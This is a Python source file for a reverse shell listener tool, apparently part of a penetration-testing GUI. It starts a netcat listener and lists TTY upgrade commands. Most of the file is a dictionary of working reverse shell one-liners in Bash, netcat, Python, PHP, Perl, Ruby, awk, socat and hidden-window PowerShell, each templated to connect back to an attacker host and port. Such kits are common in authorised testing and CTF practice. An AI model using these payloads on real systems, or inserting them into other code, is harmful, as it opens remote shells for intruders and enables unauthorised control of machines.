"""
Reverse shell listener - catches incoming connections
Includes automatic TTY upgrade commands and common payloads.
"""
import socket
import threading
import subprocess


def get_local_ips() -> list[str]:
    """Get all local IPs (useful for listener setup)."""
    ips = []
    try:
        hostname = socket.gethostname()
        # Local hostname resolution
        ips.append(socket.gethostbyname(hostname))
    except Exception:
        pass
    # Get tun0 (VPN) if exists
    try:
        result = subprocess.run(["ip", "-4", "-o", "addr"],
                                capture_output=True, text=True, timeout=2)
        for line in result.stdout.splitlines():
            if "tun0" in line or "tap0" in line or "eth0" in line or "wlan0" in line:
                parts = line.split()
                for i, p in enumerate(parts):
                    if p == "inet":
                        ip = parts[i+1].split("/")[0]
                        if ip not in ips:
                            ips.append(ip)
    except Exception:
        pass
    return ips or ["127.0.0.1"]


TTY_UPGRADE_COMMANDS = [
    ("python3 PTY spawn",
     "python3 -c 'import pty;pty.spawn(\"/bin/bash\")'"),
    ("python PTY spawn",
     "python -c 'import pty;pty.spawn(\"/bin/bash\")'"),
    ("script binary",
     "script /dev/null -c bash"),
    ("export terminal",
     "export TERM=xterm"),
    ("stty rows/cols",
     "stty rows 40 cols 140"),
    ("Ctrl+Z then bg stty",
     "# Locally (after Ctrl+Z): stty raw -echo; fg; reset"),
]


REVERSE_SHELL_PAYLOADS = {
    "Bash TCP":
        "bash -i >& /dev/tcp/{lhost}/{lport} 0>&1",
    "Bash (brace-safe)":
        "bash -c '{{bash,-i}}>{{/dev/tcp/{lhost}/{lport}}}0>&1'",
    "Bash (no &)":
        "0<&196;exec 196<>/dev/tcp/{lhost}/{lport}; sh <&196 >&196 2>&196",
    "Netcat (traditional)":
        "nc -e /bin/bash {lhost} {lport}",
    "Netcat (mkfifo)":
        "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {lhost} {lport} >/tmp/f",
    "Python3":
        "python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{lhost}\",{lport}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\"/bin/bash\")'",
    "PHP":
        "php -r '$sock=fsockopen(\"{lhost}\",{lport});exec(\"/bin/sh -i <&3 >&3 2>&3\");'",
    "Perl":
        "perl -e 'use Socket;$i=\"{lhost}\";$p={lport};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");}};'",
    "Ruby":
        "ruby -rsocket -e 'exit if fork;c=TCPSocket.new(\"{lhost}\",\"{lport}\");while(cmd=c.gets);IO.popen(cmd,\"r\"){{|io|c.print io.read}}end'",
    "Powershell":
        "powershell -NoP -NonI -W Hidden -Exec Bypass -Command \"$client = New-Object System.Net.Sockets.TCPClient('{lhost}',{lport});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()\"",
    "Awk":
        "awk 'BEGIN {{s = \"/inet/tcp/0/{lhost}/{lport}\"; while(42) {{ do{{ printf \"shell>\" |& s; s |& getline c; if(c){{ while ((c |& getline) > 0) print $0 |& s; close(c); }} }} while(c != \"exit\") close(s); }}}}' /dev/null",
    "Socat":
        "socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:{lhost}:{lport}",
}


class ShellListener:
    def __init__(self, output_callback, status_callback):
        self.output_callback = output_callback
        self.status_callback = status_callback
        self.process = None
        self.running = False

    def start(self, port: str, use_rlwrap: bool = True):
        """Start a netcat listener on the given port."""
        # Prefer rlwrap for better line editing, fall back to plain nc
        if use_rlwrap:
            cmd = ["rlwrap", "nc", "-lvnp", str(port)]
        else:
            cmd = ["nc", "-lvnp", str(port)]

        self.running = True
        self.output_callback(f"\n{'─'*60}\n", "separator")
        self.output_callback(f"  LISTENER  Starting on port {port}\n", "cmd")
        self.output_callback(f"  CMD       {' '.join(cmd)}\n", "info")
        self.output_callback(f"{'─'*60}\n\n", "separator")

        self.output_callback(f"  📡 Waiting for incoming connection...\n", "hint")
        self.output_callback(f"  💡 Send the shell from target, then use TTY upgrade tab.\n\n", "hint")

        self.status_callback(f"Listening on port {port}", "running")

        try:
            self.process = subprocess.Popen(
                cmd,
                stdout=subprocess.PIPE,
                stderr=subprocess.STDOUT,
                stdin=subprocess.PIPE,
                text=True, bufsize=1
            )

            def reader():
                for line in self.process.stdout:
                    self.output_callback(line, "output")
                self.running = False
                self.status_callback("Listener closed", "info")

            threading.Thread(target=reader, daemon=True).start()

        except FileNotFoundError as e:
            tool = "rlwrap" if use_rlwrap else "nc"
            self.output_callback(f"\n  ERROR  '{tool}' not found.\n", "error")
            if use_rlwrap:
                self.output_callback(f"  HINT   Try unchecking 'Use rlwrap' or: sudo apt install rlwrap\n\n", "hint")
            else:
                self.output_callback(f"  HINT   sudo apt install netcat-traditional\n\n", "hint")
            self.running = False

    def stop(self):
        if self.process and self.running:
            self.process.terminate()
            self.running = False
            self.output_callback("\n  LISTENER  Stopped.\n\n", "warning")

    def send_command(self, cmd: str):
        """Send a command through stdin to the active shell."""
        if self.process and self.running:
            try:
                self.process.stdin.write(cmd + "\n")
                self.process.stdin.flush()
            except Exception as e:
                self.output_callback(f"  ERROR  {str(e)}\n", "error")
